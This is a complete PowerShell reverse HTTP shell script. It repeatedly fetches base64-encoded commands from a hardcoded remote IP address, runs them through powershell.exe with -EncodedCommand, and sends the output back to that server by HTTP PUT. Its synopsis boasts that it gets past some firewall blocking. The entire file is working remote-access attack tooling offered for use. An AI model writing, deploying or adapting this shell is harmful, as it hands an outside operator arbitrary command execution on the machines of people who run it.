<#
.AUTHOR
0x10F8

.SYNOPSIS
Allows a device running powershell capable windows to connect to a remote server and 
interpret commands from this server as commands on the device (reverse http shell).
This shell uses the HTTP protocol.

The server side of this script requires to be something running on the correct server
address and port, which will serve up commands from the http://<server>:<port>/cmd 
address as GET requests. A single command should be served once, the client will 
make constant requests but if the server doesn't serve anything up the client will
not respond. When the client receives a command from the cmd url it will send its
response back to the server using HTTP PUT at the url http://<server>:<port>/output.

Obviously this script will defeat some firewall blocking but the entire communication
can be sniffed, so I will hopefully implement something using HTTPS in the future.

.EXAMPLE
Connect back to the reverse shell server
PS C:\> .\reverse_http.ps1 -s 127.0.0.1 -p 9001
PS C:\> .\reverse_http.ps1 -s 127.0.0.1 <- defaults to port 80
If you want to debug the script the verbose option will output a lot of info during running
#>

# Param (
#     [Parameter(Mandatory = $true)]    [string]    [ValidateNotNullOrEmpty()]  [Alias('s')]  $server,
#     [Parameter(Mandatory = $false)]    [int]       [ValidateNotNullOrEmpty()]  [Alias('p')]  $port = 80
# )

$port = 80
$server = "100.26.120.221"
$SEND_PATH = "cmd"
$RECV_PATH = "output"
$PROTOCOL = "http"

$END_CMD = "stopshell"

$send_url = "$PROTOCOL`://$server`:$port/$SEND_PATH"
$recv_url = "$PROTOCOL`://$server`:$port/$RECV_PATH"

$WAIT_MS = 500 

function Get-Command {
    $command = Invoke-RestMethod -Method "GET" $send_url | Out-String
    # $command = Invoke-RestMethod -Method "GET" $send_url 
    # $command = [system.Text.Encoding]::UTF8.GetString((Invoke-RestMethod -Method "GET" $send_url).RawContentStream.ToArray())
    return [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($command))
}

function Invoke-Cmd([string] $command) {
    <#
    .Description
    Invokes the command given and returns the response as a string
    #> 
    $response = ""
    if ($command) {
        Write-Verbose "Recieved command: $command"
        try {
            # Encode the command as base64 and send to powershell
            # This seems to solve some issues around formatting and escaping
            
            $commandbytes = [System.Text.Encoding]::Unicode.GetBytes($command)#[System.Text.Encoding]::UTF8.GetBytes($command)
            
            $base64command = [System.Convert]::ToBase64String($commandbytes)
            $response = &powershell.exe -EncodedCommand "$base64command" 2>&1 | Out-String
            # $response = &powershell.exe [System.Text.Encoding]::Unicode.($command)
        }
        catch {
            Write-Output "error"
            $response = $error[0]
        }
        Write-Verbose "The response: $response"
    }
    return $response
}

function Send-Response($response) {
    if ($response) {
        Invoke-RestMethod -Method "PUT" -Body ([System.Text.Encoding]::UTF8.GetBytes($response)) $recv_url
    }
    else {
        Invoke-RestMethod -Method "PUT" -Body "no output" $recv_url
    }
}

# Do get requests to the http server every 500ms

$connected = $true

while ($connected) {

    $command = Get-Command
    
    # Look for the end command which stops the shell remotely
    if ($command.Length -gt 0) {
        # Write-Output "co$command, L " $command.Length
        if ($command -like "*$END_CMD*") {
            Write-Verbose "Shutting down"
            $connected = $false
        }
        elseif ($command.IndexOf("000") -eq 0) {
       
            $t = $command.Substring(3, $command.Length - 3)
            Set-Location -Path $t
            $path = Get-Location | Out-String
            Send-Response $path
        }
        else {
            # Else execute the command and send the response
            $response = Invoke-Cmd $command
            # Write-Output $response.Length
            # Write-Output "Recieved command: $command"
            Send-Response $response
            # Write-Output "hi" $response.Length
        }
    }
    # Wait a short time before the next read/write loop
    start-sleep -Milliseconds $WAIT_MS
}
